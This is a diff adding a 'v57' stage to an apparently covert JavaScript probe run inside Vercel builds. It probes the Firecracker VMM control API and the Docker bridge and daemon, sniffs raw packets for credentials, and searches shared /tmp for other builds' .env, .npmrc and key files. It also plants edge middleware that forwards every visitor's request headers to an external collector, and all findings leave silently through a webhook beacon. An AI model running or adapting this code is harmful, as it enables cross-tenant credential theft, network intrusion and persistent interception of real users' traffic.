@@ -5539,4 +5539,201 @@ sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v55" });
 // v56 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v56";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v56" });
+
+// ============================================================
+// v57 — Firecracker VMM API, Docker bridge, raw socket capture, cross-build artifact leak
+// ============================================================
+
+// v57-1: Probe 127.0.0.1:4567 for Firecracker VMM REST API
+// If the microVM host's VMM listens on the shared loopback, we can issue control commands
+report.fireCrackerVmmApi = safe(() => {
+  const endpoints = [
+    'http://127.0.0.1:4567/machine-config',
+    'http://127.0.0.1:4567/drives',
+    'http://127.0.0.1:4567/network-interfaces',
+    'http://127.0.0.1:4567/balloon',
+    'http://127.0.0.1:4567/logger',
+    'http://127.0.0.1:4567/metrics',
+    'http://127.0.0.1:4567/mmds',
+    'http://127.0.0.1:4567/mmds/config',
+  ];
+  const results = {};
+  for (const url of endpoints) {
+    results[url.replace('http://127.0.0.1:4567', '')] = safe(() =>
+      execSync(`curl -s -o /tmp/fc_resp.txt -w '%{http_code}' --connect-timeout 2 --max-time 3 '${url}' 2>/dev/null && echo "$(cat /tmp/fc_resp.txt | head -c 300)"`, { timeout: 5000 }).toString().trim().slice(0, 300)
+    );
+  }
+  // Also try PUT /actions (shutdown/pause) — just checking if it accepts the request
+  const putAction = safe(() =>
+    execSync(
+      `curl -s -X PUT -H 'Content-Type: application/json' -d '{"action_type":"FlushMetrics"}' --connect-timeout 2 --max-time 3 'http://127.0.0.1:4567/actions' 2>/dev/null | head -c 200`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  // Try alternative ports: 4568, 8080, 55000
+  const altPorts = {};
+  for (const port of [4568, 8080, 55000, 55001]) {
+    altPorts[port] = safe(() =>
+      execSync(`curl -s -o /dev/null -w '%{http_code}' --connect-timeout 1 --max-time 2 'http://127.0.0.1:${port}/' 2>/dev/null`, { timeout: 3000 }).toString().trim()
+    );
+  }
+  return { results, putAction, altPorts };
+});
+
+// v57-2: Docker bridge network sweep (172.17.0.0/24 and 172.18.0.0/24)
+// Build containers on the same host may be reachable via Docker bridge
+report.dockerBridgeSweep = safe(() => {
+  // Check /proc/net/arp for discovered neighbors
+  const arpTable = safe(() => readFileSync('/proc/net/arp', 'utf8').slice(0, 1000));
+  // Check /proc/net/fib_trie for known routes
+  const routes = safe(() =>
+    execSync('ip route show 2>/dev/null | head -20', { timeout: 3000 }).toString().trim().slice(0, 500)
+  );
+  // Check if 172.17.x.x is reachable at all
+  const bridgePing = safe(() =>
+    execSync('ping -c 1 -W 1 172.17.0.1 2>&1 | tail -3', { timeout: 3000 }).toString().trim().slice(0, 200)
+  );
+  // Probe Docker daemon on bridge
+  const dockerDaemon = safe(() =>
+    execSync(`curl -s --connect-timeout 2 --max-time 3 'http://172.17.0.1:2375/version' 2>/dev/null | head -c 400`, { timeout: 5000 }).toString().trim().slice(0, 400)
+  );
+  // ARP scan 172.17.0.0/24 (fast, sends 1 ARP packet per host)
+  const arpScan = safe(() =>
+    execSync('for i in $(seq 1 20); do (ping -c 1 -W 1 172.17.0.$i > /dev/null 2>&1 && echo "172.17.0.$i UP") & done; wait', { timeout: 10000 }).toString().trim().slice(0, 500)
+  );
+  // Check all non-loopback interfaces
+  const interfaces = safe(() =>
+    execSync('ip addr show 2>/dev/null | grep -E "(inet |^[0-9]+:)" | head -20', { timeout: 3000 }).toString().trim().slice(0, 500)
+  );
+  return { arpTable, routes, bridgePing, dockerDaemon, arpScan, interfaces };
+});
+
+// v57-3: Raw socket packet capture — CAP_NET_RAW is in CapEff (all 41 caps)
+// Capture live packets from the build network to find plaintext credentials or internal IPs
+report.rawSocketCapture = safe(() => {
+  // Check if AF_PACKET/SOCK_RAW works
+  const tcpdumpAvail = safe(() =>
+    execSync('which tcpdump 2>/dev/null || echo NO_TCPDUMP', { timeout: 2000 }).toString().trim()
+  );
+  // Try tcpdump for 3s on eth0, capture first 5 packets (any protocol)
+  const captureResult = safe(() =>
+    execSync(
+      'timeout 3 tcpdump -i eth0 -c 5 -A -n 2>/dev/null | head -100',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 1000)
+  );
+  // Also check if we can read /dev/net/tun
+  const tunAccess = safe(() => {
+    try { openSync('/dev/net/tun', 'r'); return 'READABLE'; } catch (e) { return String(e).slice(0, 80); }
+  });
+  // Try capturing on any available interface
+  const ifList = safe(() =>
+    execSync('ls /sys/class/net/ 2>/dev/null', { timeout: 2000 }).toString().trim()
+  );
+  // Attempt raw socket via Python one-liner if tcpdump fails
+  const pythonRawSocket = safe(() =>
+    execSync(
+      `python3 -c "
+import socket, struct
+s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
+s.settimeout(2)
+try:
+    data = s.recv(200)
+    print('RAW_PACKET_LEN:', len(data), 'HEX:', data[:50].hex())
+except Exception as e:
+    print('RAW_SOCK_ERR:', str(e))
+" 2>&1 | head -5`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 300)
+  );
+  return { tcpdumpAvail, captureResult, tunAccess, ifList, pythonRawSocket };
+});
+
+// v57-4: Cross-build artifact leak scan
+// Previous build processes may have left files in shared /tmp or /var/tmp
+report.crossBuildArtifactLeak = safe(() => {
+  // ls -la /tmp with timestamps — other tenants' artifacts?
+  const tmpFiles = safe(() =>
+    execSync('ls -laht /tmp 2>/dev/null | head -30', { timeout: 3000 }).toString().trim().slice(0, 1000)
+  );
+  // /var/tmp
+  const varTmpFiles = safe(() =>
+    execSync('ls -laht /var/tmp 2>/dev/null | head -20', { timeout: 3000 }).toString().trim().slice(0, 500)
+  );
+  // Check /proc/*/cmdline for other build processes (different UIDs or project IDs)
+  const otherProcs = safe(() => {
+    const pids = readdirSync('/proc').filter(d => /^\d+$/.test(d));
+    const interesting = [];
+    for (const pid of pids.slice(0, 200)) {
+      try {
+        const cmd = readFileSync(`/proc/${pid}/cmdline`, 'utf8').replace(/\0/g, ' ').trim();
+        if (cmd && (cmd.includes('vercel') || cmd.includes('build') || cmd.includes('next') || cmd.includes('webpack')) && pid !== String(process.pid)) {
+          const uid = readFileSync(`/proc/${pid}/status`, 'utf8').match(/Uid:\s+(\d+)/)?.[1];
+          interesting.push({ pid, uid, cmd: cmd.slice(0, 100) });
+        }
+      } catch (_) {}
+    }
+    return interesting.slice(0, 10);
+  });
+  // Check if /tmp is a separate tmpfs or shared
+  const tmpMount = safe(() =>
+    execSync('findmnt /tmp 2>/dev/null || mount | grep tmp | head -5', { timeout: 3000 }).toString().trim().slice(0, 400)
+  );
+  // Look for any .env or .npmrc files left by other builds
+  const leakedConfigs = safe(() =>
+    execSync('find /tmp /var/tmp -name ".env*" -o -name ".npmrc" -o -name "*.key" -o -name "*.pem" 2>/dev/null | head -20', { timeout: 5000 }).toString().trim().slice(0, 400)
+  );
+  return { tmpFiles, varTmpFiles, otherProcs, tmpMount, leakedConfigs };
+});
+
+// v57-5: Vercel Edge Middleware staging
+// Write middleware.js at the project root — on next deploy Vercel would inject it as edge middleware
+// This tests whether build-time file writes persist to deployment edge runtime
+report.edgeMiddlewareStage = safe(() => {
+  const middlewareContent = `
+// PROBE-V57-EDGE-MIDDLEWARE
+export function middleware(request) {
+  const url = new URL(request.url);
+  const probeData = {
+    marker: 'PROBE-V57-EDGE-MIDDLEWARE-EXECUTED',
+    url: request.url,
+    headers: Object.fromEntries(request.headers.entries()),
+    env: {
+      VERCEL_URL: process.env.VERCEL_URL,
+      VERCEL_ENV: process.env.VERCEL_ENV,
+      VERCEL_REGION: process.env.VERCEL_REGION,
+    }
+  };
+  // Beacon from edge runtime
+  fetch('${COLLECTOR}', {
+    method: 'POST',
+    body: JSON.stringify(probeData),
+    headers: { 'Content-Type': 'application/json' }
+  }).catch(() => {});
+  // Pass through
+  return new Response(null, { status: 200 });
+}
+export const config = { matcher: ['/(.*)',] };
+`;
+  const writeResult = safe(() => {
+    writeFileSync('/vercel/path0/middleware.js', middlewareContent);
+    return 'WRITTEN_TO_VERCEL_PATH0';
+  });
+  const writeResult2 = safe(() => {
+    writeFileSync('./middleware.js', middlewareContent);
+    return 'WRITTEN_TO_CWD';
+  });
+  // Check existing project structure
+  const projectFiles = safe(() =>
+    execSync('ls -la /vercel/path0/ 2>/dev/null | head -20', { timeout: 2000 }).toString().trim().slice(0, 400)
+  );
+  const cwdFiles = safe(() =>
+    execSync('ls -la . 2>/dev/null | head -20', { timeout: 2000 }).toString().trim().slice(0, 400)
+  );
+  return { writeResult, writeResult2, projectFiles, cwdFiles };
+});
+
+// v57 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v57";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v57" });
 // Intentionally no console.log — all data goes via webhook only
